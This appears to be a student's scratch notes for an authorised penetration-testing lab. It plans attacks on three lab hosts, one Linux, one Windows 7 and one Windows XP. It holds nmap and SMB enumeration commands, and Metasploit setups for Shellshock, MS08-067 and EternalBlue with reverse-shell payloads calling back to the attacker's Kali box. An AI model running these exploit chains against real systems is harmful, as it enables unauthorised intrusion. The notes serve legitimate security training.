# Work (scratch)

Session transcripts, command snippets, loot exports, and rough notes. Keep **passwords and live tokens out of git**—paste redacted copies here if you need a paper trail.

---

# Plan of attack (A_Rocha IPs)

**Scope:** Lab-authorized targets only — `10.20.160.102`, `10.20.160.101`, `10.20.160.100`.  
**Operator VM:** **KALI6** (see [parent README](../README.md)).  
**Placeholders:** Replace `<KALI_IP>` with your Kali interface IP (e.g. from `ip -br a` or `ip addr`), `<RHOST>` with the target below.

Summaries below match the Nessus notes in [../README.md](../README.md#nessus--my-hosts-specs--findings); adjust ports and paths after your own `nmap` / service scan.

---

## `10.20.160.102` — Linux (Kernel 2.6)

### Specs & exposure (recap)

| Field | Value |
|-------|--------|
| **OS** | Linux Kernel 2.6 |
| **Nessus highlights** | **Shellshock** (CGI, critical), legacy **SSLv2/v3**, **TLS 1.0**, **DROWN**, **TRACE/TRACK**, **printenv** CGI disclosure, **Logjam**, HTTP/PHP surface |

### Vulnerabilities (brief)

- **Shellshock** — Bash CGI environment injection; often entry via `/cgi-bin/` scripts.
- **Weak TLS stack** — old OpenSSL behavior; may support bad ciphers; useful for MiTM in class demos, less often direct shell.
- **HTTP methods / CGI** — TRACE/TRACK and printenv-style scripts can leak config or assist chaining with Shellshock.

### Plan of attack (commands)

**1 — Map services (adjust ports after discovery).**

```bash
# Identity stamp (course habit)
echo "$USER"; date
export RHOST=10.20.160.102

nmap -Pn -sS -sV -sC -T4 "$RHOST" -oA ~/scans/nmap_102_initial
nmap -Pn -sV --top-ports 1000 "$RHOST"
# If web suspected:
nmap -Pn -p 80,443,8080,8443 -sV --script http-enum,http-headers "$RHOST"
```

**2 — Shellshock validation (non-destructive first).**

```bash
# If HTTP(S) on 80/443/8080 — list scripts
curl -sik "http://$RHOST/" 
curl -sik "http://$RHOST/cgi-bin/" 

# Nmap Shellshock script against known web ports
nmap -Pn -p 80,443,8080 --script http-shellshock --script-args http-shellshock.uri=/cgi-bin/test.cgi "$RHOST"
```

**3 — Exploitation path (Metasploit example — module names may vary by version).**

```bash
msfconsole -q
```

```text
workspace -a final_systems
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 10.20.160.102
set RPORT 80
set TARGETURI /cgi-bin/<script_from_enum>
set LHOST <KALI_IP>
set LPORT 4444
set PAYLOAD cmd/unix/reverse_bash
run
```

**4 — Post-ex (local proof / flags).**

```bash
# In obtained shell — adapt paths for course flags
hostname; whoami; id
find / -name "local.txt" 2>/dev/null
find / -name "proof.txt" 2>/dev/null
```

### Recon snapshot — `10.20.160.102` (validated)

![nmap initial: 10.20.160.102 — Apache 2.2.21, PHP 5.3.8, 80/443 open](../Screenshots/recon_nmap_102_initial_tm6_afrocha.png)

| Observation | Detail |
|-------------|--------|
| **Command** | `nmap -Pn -sS -sV -T4 "$RHOST_102" -oA ~/scans/nmap_102_initial` (your run) |
| **Identity stamp** | `echo TM6_afrocha; date` — good habit; keep on evidence for the report |
| **22/tcp** | **Closed** — skip SSH brute force for this target for now |
| **80/tcp** | **Open** — **Apache httpd 2.2.21** (Unix), **PHP/5.3.8**, **WebDAV (DAV/2)**, **mod_ssl** + **OpenSSL 1.0.0c**, mod_perl / Perl 5.10.1 |
| **443/tcp** | **Open** — treat as HTTPS; run TLS/http scripts after 80 |
| **997 filtered** | Narrow external surface — focus on **web** paths |

**Can we move forward with the plan of attack, or adjust?**

**Move forward — same overall plan (web / CGI / Shellshock lane).** The live scan **confirms** a classic **outdated LAMP-style stack** on **80/443**, which matches the Nessus story (Shellshock, CGI, weak TLS). **Adjustments to prioritize next:**

1. **Double down on HTTP enumeration** — discover real script paths before Metasploit `TARGETURI`: `curl -sik http://10.20.160.102/`, directory brute force on `/cgi-bin/` and common dirs, then `nmap -p80,443 --script http-enum,http-shellshock` with **discovered** URIs (not only `/cgi-bin/test.cgi`).
2. **Add version-led exploit search** — `searchsploit apache 2.2.21`, `searchsploit php 5.3.8`, and Metasploit `search type:exploit apache` / `php` (lab-authorized only).
3. **WebDAV** — if PROPFIND/PUT behavior is weak, note it as a separate finding path (upload / traversal) per rubric.
4. **Do not** sink time into **SSH** on this host until web lanes are exhausted (port 22 closed).

`.101` and `.100` sections are **unchanged** until you have equivalent nmap evidence for those.

---

## `10.20.160.101` — Windows 7 Ultimate

### Specs & exposure (recap)

| Field | Value |
|-------|--------|
| **MAC** | 00:50:56:86:4F:A2 |
| **OS** | Windows 7 Ultimate |
| **Open ports (from host table)** | 135, 139, 445, 49152–49222 range (RPC/SMB stack) |
| **Nessus highlights** | **SSLv2/v3**, **RDP MiTM class** finding, **DROWN**, **Logjam**, **FTP** info, terminal services crypto not FIPS |

### Vulnerabilities (brief)

- **SMB / Windows RPC** — enumerate shares, users, signing; pivot for creds or MS17-010 class checks if applicable to build.
- **RDP (3389 likely)** — password spray / known weak creds in lab; “MiTM” plugin is a hygiene signal, not a remote exploit by itself.
- **FTP** — anonymous or weak creds if enabled.
- **SSL/TLS** — downgrade issues; usually supporting evidence, not primary shell path.

### Plan of attack (commands)

**1 — SMB & MS-RPC fingerprint.**

```bash
export RHOST=10.20.160.101

nmap -Pn -sV -p 135,139,445,21,3389,5985 -sC "$RHOST" -oA ~/scans/nmap_101
nmap -Pn -p445 --script smb-os-discovery,smb-security-mode,smb-enum-shares "$RHOST"
```

**2 — SMB enum (no creds → then with creds).**

```bash
smbclient -L "//${RHOST}" -N
crackmapexec smb "$RHOST" --shares -u '' -p ''
enum4linux -a "$RHOST"
```

**3 — MS17-010 style check (only if SMB says Win7 and lab allows).**

```bash
nmap -Pn -p445 --script smb-vuln-ms17-010 "$RHOST"
# Metasploit:
# use auxiliary/scanner/smb/smb_ms17_010
# set RHOSTS 10.20.160.101; run
```

**4 — RDP if 3389 open.**

```bash
nmap -Pn -p3389 -sV "$RHOST"
# xfreerdp example (after you HAVE creds):
# xfreerdp /v:"$RHOST" /u:<user> /p:<pass> /cert:ignore
```

**5 — FTP if open.**

```bash
nmap -Pn -p21 -sV -sC "$RHOST"
ftp "$RHOST"
# test anonymous: user anonymous, pass test@
```

---

## `10.20.160.100` — Windows XP (EOL)

### Specs & exposure (recap)

| Field | Value |
|-------|--------|
| **OS** | Windows XP SP2/SP3 / embedded variant |
| **Open ports (from host table)** | **139, 445** (SMB), RDP likely given Nessus |
| **Nessus highlights** | **Unsupported XP** (critical), **SMB** issues, **RDP** MiTM class, many **info** SMB/plugin rows |

### Vulnerabilities (brief)

- **EOL OS** — huge unpatched surface; **SMBv1** era bugs (MS08-067, MS17-010) *may* apply depending on service pack and lab image.
- **RDP** — weak creds or known lab passwords.
- **SMB** — null session, share enumeration, pipe abuse per lab tooling.

### Plan of attack (commands)

**1 — Fast SMB + vuln scripts.**

```bash
export RHOST=10.20.160.100

nmap -Pn -sV -p139,445,3389 -sC "$RHOST" -oA ~/scans/nmap_100
nmap -Pn -p445 --script smb-os-discovery,smb-vuln-ms17-010,smb-vuln-ms08-067 "$RHOST"
```

**2 — Enum4linux / smbclient.**

```bash
enum4linux -a "$RHOST"
smbclient -L "//${RHOST}" -N
rpcclient -U "" -N "$RHOST"
```

**3 — Metasploit lanes (pick what matches scan; do not blindly exploit).**

```text
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.20.160.100
run

use exploit/windows/smb/ms08_067_netapi
# OR (if SP/build matches MS17-010 positive check):
# use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.20.160.100
set LHOST <KALI_IP>
set payload windows/meterpreter/reverse_tcp
check
```

**4 — Proof files (same pattern as other hosts).**

```text
meterpreter > getuid
meterpreter > shell
C:\> hostname && whoami
C:\> dir /s /b proof.txt 2>nul & dir /s /b local.txt 2>nul
```

---

## Ordering suggestion (one operator on KALI6)

1. **.102** — Often fastest **web/Shellshock** path to a shell; low collision with SMB-heavy Windows work.  
2. **.100** — **XP/SMB** classics; do while you have Metasploit workspace warm.  
3. **.101** — **Win7** harder target; use creds or results from **.100** lateral moves if the scenario allows.

Document **what you ran**, **what failed**, and **screenshots** under [`../Screenshots/`](../Screenshots/) before promoting to team [`../../1_Screenshots/`](../../1_Screenshots/).
